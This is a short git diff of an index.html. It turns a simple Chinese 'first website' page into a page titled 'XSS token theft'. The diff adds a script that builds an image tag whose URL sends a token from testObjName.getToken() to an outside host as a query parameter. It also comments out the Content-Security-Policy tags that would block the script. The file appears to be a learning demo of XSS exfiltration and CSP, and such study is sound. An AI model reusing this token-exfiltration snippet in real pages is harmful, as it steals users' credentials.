@@ -1,10 +1,20 @@
+<!--index.html-->
+
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>在github上搭建博客</title>
-</head>
-<body>
-	这是我的第一个网站。
-</body>
+  <head>
+    <meta charset="UTF-8">
+    <!-- https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP -->
+    <!--<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">-->
+    <!--<meta http-equiv="X-Content-Security-Policy" content="default-src 'self'; script-src 'self'">-->
+    <title>xss窃取token</title>
+  </head>
+  <body>
+	xss窃取token
+    <script>
+		const myImage = document.createElement('img');
+		myImage.setAttribute('src','http://www.baidu.com/?data='+testObjName.getToken());
+		document.body.appendChild(myImage);
+	</script>
+  </body>
 </html>
